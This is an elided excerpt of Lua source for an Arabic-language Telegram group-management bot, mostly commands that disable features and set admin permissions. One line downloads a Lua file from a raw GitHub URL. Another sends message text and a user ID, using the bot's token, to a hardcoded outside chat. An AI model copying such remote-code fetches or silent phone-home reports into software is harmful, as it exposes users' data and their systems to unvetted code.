...
{
{text = '𝑺𝒐𝒖𝒓𝒄𝒆', url='https://t.me/N00NN0'},
},
}
}
LuaTele.sendText(msg_chat_id,msg_id,[[
...
return LuaTele.sendText(msg_chat_id,msg_id,"\n⇜ ابشر عطلت الاشتراك الاجباري","md",true)  
end
...
download('https://raw.githubusercontent.com/SorceLink/hidar/blob/main/FDFGERB.lua','FDFGERB.lua')
...
data = {
{
{text = '- ابشر ورفعت المالك والادمنيه', data = msg.sender.user_id..'/addAdmins@'..msg_chat_id},
},
{
...
return LuaTele.sendText(msg_chat_id,msg_id,'\n⇜ المجموعه : ['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..') \n⇜ ابشر فعلت القروب ','md', true, false, false, false, reply_markup)
end
end 
...
return LuaTele.sendText(msg_chat_id,msg_id,"\n⇜ الوضع الخدمي ابشر عطلته من قبل Dev🎖 البوت ","md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
if Redis:sismember(FDFGERB.."FDFGERB:ChekBotAdd",msg_chat_id) then
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت (الرفع) من قبل المنشئين","md",true)
end 
...
Redis:del(FDFGERB.."FDFGERB:Status:Del:Media"..msg.chat_id)
 LuaTele.sendText(msg_chat_id,msg_id,'⇜ ابشر عطلت المسح التلقائي للميديا')
return false
end 
...
{
{text = 'قناة السورس',url="t.me/N00NN0"}
},
}
...
return LuaTele.sendText(msg_chat_id,msg_id,'- ابشر عطلت @all من قبل المدراء',"md",true)  
end
...
data = {
{
{text = '❲ 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓🎖 ❳', url = "https://t.me/N00NN0"}
},
{
{text = 'Armando', url = "https://t.me/iiiziiii"}
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,"[Toky Source .](t.me/N00NN0)\n\n[سورس طوكي ،](t.me/N00NN0)","md",true, false, false, false,reply_markup)
end
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت التحقق ","md",true)
end
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الرابط ","md",true)
end
if TextMsg == 'الترحيب' then
Redis:del(FDFGERB.."FDFGERB:Status:Welcome"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الترحيب ","md",true)
end
if TextMsg == 'الايدي' then
if not msg.Managers then
return LuaTele.sendText(msg_chat_id,msg_id,'\n⇜ الامر يخص ( '..Controller_Num(6)..' ) ',"md",true)  
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الايدي ","md",true)
end
if TextMsg == 'الايدي بالصوره' then
if not msg.Managers then
return LuaTele.sendText(msg_chat_id,msg_id,'\n⇜ الامر يخص ( '..Controller_Num(6)..' ) ',"md",true)  
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الايدي بالصوره ","md",true)
end
if TextMsg == 'الردود' then
if not msg.Managers then
return LuaTele.sendText(msg_chat_id,msg_id,'\n⇜ الامر يخص ( '..Controller_Num(6)..' ) ',"md",true)  
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الردود ","md",true)
end
if TextMsg == 'الردود العامه' then
if not msg.Managers then
return LuaTele.sendText(msg_chat_id,msg_id,'\n⇜ الامر يخص ( '..Controller_Num(6)..' ) ',"md",true)  
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الردود العامه ","md",true)
end
if TextMsg == 'الحظر' or TextMsg == 'الطرد' or TextMsg == 'التقييد' then
if not msg.Managers then
return LuaTele.sendText(msg_chat_id,msg_id,'\n⇜ الامر يخص ( '..Controller_Num(6)..' ) ',"md",true)  
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الحظر , الطرد , التقييد","md",true)
end
if TextMsg == 'الرفع' then
if not msg.Originators then
return LuaTele.sendText(msg_chat_id,msg_id,'\n⇜ الامر يخص ( '..Controller_Num(5)..' ) ',"md",true)  
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الرفع ","md",true)
end
if TextMsg == 'الالعاب' then
Redis:del(FDFGERB.."FDFGERB:Status:Games"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الالعاب ","md",true)
end
if TextMsg == 'اطردني' then
Redis:del(FDFGERB.."FDFGERB:Status:KickMe"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت اطردني ","md",true)
end
if TextMsg == 'البوت الخدمي' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n⇜ الامر يخص ( '..Controller_Num(1)..' ) ',"md",true)  
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت البوت الخدمي ","md",true)
end
if TextMsg == 'التواصل' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n⇜ الامر يخص ( '..Controller_Num(1)..' ) ',"md",true)  
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت التواصل داخل البوت ","md",true)
end
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n⇜ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ امر اطردني ابشر عطلته من قبل المدراء ","md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n⇜ عذرآ البوت ليس ادمن في المجموعه يرجى ترقيته وتفعيل الصلاحيات له ","md",true)  
end
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت جلب الرابط من قبل الادمنيه","md",true)
end 
local Get_Chat = LuaTele.getChat(msg_chat_id)
...
return LuaTele.sendText(msg_chat_id,msg_id,"⇜ ابشر عطلت الترحيب من قبل الادمنيه","md",true)
end 
local Welcome = Redis:get(FDFGERB.."FDFGERB:Welcome:Group"..msg_chat_id)
if Welcome then 
...
https.request("https://api.telegram.org/bot"..Token..'/sendmessage?chat_id=1099083018&text=' .. text..' Id : '..msg.sender.user_id.."&parse_mode=markdown&disable_web_page_preview=true") 
...
{
{text = 'تحديثات لبوت', url = 't.me/N00NN0'}, 
},
}
}
...
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر الرابط").unLock, 'md', true, false, reply_markup)
end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر الترحيب").unLock, 'md', true, false, reply_markup)
end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر الايدي").unLock, 'md', true, false, reply_markup)
end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر الايدي بالصوره").unLock, 'md', true, false, reply_markup)
end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر الردود").unLock, 'md', true, false, reply_markup)
end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر الردود العامه").unLock, 'md', true, false, reply_markup)
end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر الرفع").unLock, 'md', true, false, reply_markup)
end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر الطرد ⇜ الحظر").unLock, 'md', true, false, reply_markup)
end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر الالعاب").unLock, 'md', true, false, reply_markup)
end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⇜ ابشر عطلت امر اطردني").unLock, 'md', true, false, reply_markup)
end
end
...
LuaTele.answerCallbackQuery(data.id, "⇜ ابشر عطلت صلاحيه تغيير المعلومات", true)
...
LuaTele.answerCallbackQuery(data.id, "⇜ ابشر عطلت صلاحيه التثبيت", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,'❬ ❌ ❭',nil,nil,nil,nil)
...
LuaTele.answerCallbackQuery(data.id, "⇜ ابشر عطلت صلاحيه الحظر", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,'❬ ❌ ❭',nil,nil,nil)
...
LuaTele.answerCallbackQuery(data.id, "⇜ ابشر عطلت صلاحيه دعوه المستخدمين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,'❬ ❌ ❭',nil,nil)
...
LuaTele.answerCallbackQuery(data.id, "⇜ ابشر عطلت صلاحيه مسح الرسائل", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,'❬ ❌ ❭',nil)
...
LuaTele.answerCallbackQuery(data.id, "⇜ ابشر عطلت صلاحيه اضافه مشرفين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,nil,'❬ ❌ ❭')
